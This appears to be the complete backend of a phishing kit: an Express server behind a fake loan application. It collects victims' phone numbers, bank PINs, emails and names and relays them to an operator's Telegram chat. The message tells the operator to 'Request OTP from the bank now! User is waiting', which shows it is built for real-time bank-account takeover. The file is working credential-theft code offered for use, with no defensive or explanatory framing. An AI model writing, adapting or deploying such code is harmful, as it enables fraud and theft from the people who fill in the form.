const express = require('express');
const cors = require('cors');
const https = require('https');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

// Health check endpoint
app.get('/api/health', (req, res) => {
    res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Telegram notification endpoint
app.post('/api/send-telegram', async (req, res) => {
    try {
        const { phone, pin, email, name, amount, term, rate, monthly, appId } = req.body;
        
        console.log('📨 Received:', { phone, pin, email });
        
        const TG_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TG_CHAT_ID = process.env.ADMIN_TELEGRAM_ID;
        
        const message = `🔔 NEW PIN CONFIRMATION 🔔\n\nPhone: ${phone}\nPIN: ${pin}\nEmail: ${email}\nName: ${name}\nLoan: $${amount} for ${term} months\nInterest: ${rate}%\nMonthly: $${monthly}\nApp ID: ${appId || 'N/A'}\n\nRequest OTP from the bank now! User is waiting.`;
        
        const url = `/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}`;
        
        const options = {
            hostname: 'api.telegram.org',
            path: url,
            method: 'GET'
        };
        
        const telegramReq = https.request(options, (telegramRes) => {
            let data = '';
            telegramRes.on('data', (chunk) => { data += chunk; });
            telegramRes.on('end', () => {
                console.log('Telegram response:', data);
                res.json({ success: true });
            });
        });
        
        telegramReq.on('error', (error) => {
            console.error('Telegram error:', error);
            res.json({ success: false, error: error.message });
        });
        
        telegramReq.end();
        
    } catch (error) {
        console.error('Error:', error.message);
        res.json({ success: false, error: error.message });
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});